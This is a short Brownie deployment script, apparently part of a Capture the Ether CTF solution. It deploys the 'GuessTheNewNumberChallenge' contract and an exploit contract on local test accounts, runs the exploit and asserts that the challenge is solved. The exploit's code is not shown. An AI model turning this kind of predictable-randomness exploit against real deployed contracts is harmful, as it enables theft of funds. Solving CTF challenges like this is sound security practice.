from brownie import GuessTheNewNumberChallenge, Gtnn_Exploit, accounts, web3


def main():
    deployer = accounts[0]
    player = accounts[1]

    contract = GuessTheNewNumberChallenge.deploy(
        {'from': deployer, 'value': '1 ether'})
    exploit = Gtnn_Exploit.deploy(
        contract.address, {'from': player, 'value': '1 ether'})

    exploit.exploit({'from': player})

    assert contract.isComplete() == True
